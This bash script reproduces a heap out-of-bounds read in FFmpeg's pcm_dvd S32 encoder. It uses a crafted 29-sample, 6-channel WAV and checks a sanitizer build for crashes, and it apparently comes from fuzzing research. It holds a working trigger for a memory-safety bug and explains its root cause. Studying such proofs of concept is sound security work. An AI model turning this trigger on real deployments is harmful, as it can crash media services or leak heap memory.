#!/bin/bash
# PoC runner for VULN-001: do-while-blocks-zero OOB heap read in pcm_dvd S32 encoder.
#
# Encodes a 6-ch S32LE 48kHz WAV with 29 samples (non-multiple of frame_size=28)
# so the last frame has nb_samples=1 < samples_per_block=4, making blocks=0.
# The do { } while(--blocks) loop runs at least once, reading OOB heap memory.

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

if [ ! -f "$BIN" ]; then
    echo "ERROR: ffmpeg binary not found at $BIN" >&2
    exit 1
fi

echo "=== Step 1: Generate crafted WAV input ==="
python3 vuln_001_gen.py

echo ""
echo "=== Step 2: Encode with pcm_dvd (primary: -f vob) ==="
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  timeout 30 "$BIN" -y \
    -i vuln_001_input.wav \
    -c:a pcm_dvd \
    -f vob \
    vuln_001_output.vob \
  > vuln_001_ffmpeg_primary.txt 2>&1 \
  && echo "Primary run exited 0" \
  || echo "Primary run exited non-zero (expected for crash/timeout)"

# Collect any ASAN logs
cat asan.log.* >> vuln_001_ffmpeg_primary.txt 2>/dev/null || true

echo ""
echo "=== Step 3: Fallback — try -f dvd if no crash yet ==="
if ! grep -qiE "heap-buffer-overflow|AddressSanitizer|SIGSEGV|Sanitizer" vuln_001_ffmpeg_primary.txt 2>/dev/null; then
    ASAN_OPTIONS="abort_on_error=0:log_path=./asan_dvd.log" \
      timeout 30 "$BIN" -y \
        -i vuln_001_input.wav \
        -c:a pcm_dvd \
        -f dvd \
        vuln_001_output_dvd.vob \
      > vuln_001_ffmpeg_dvd.txt 2>&1 \
      && echo "DVD fallback exited 0" \
      || echo "DVD fallback exited non-zero"
    cat asan_dvd.log.* >> vuln_001_ffmpeg_dvd.txt 2>/dev/null || true
    cat vuln_001_ffmpeg_dvd.txt
fi

echo ""
echo "=== Results ==="
cat vuln_001_ffmpeg_primary.txt
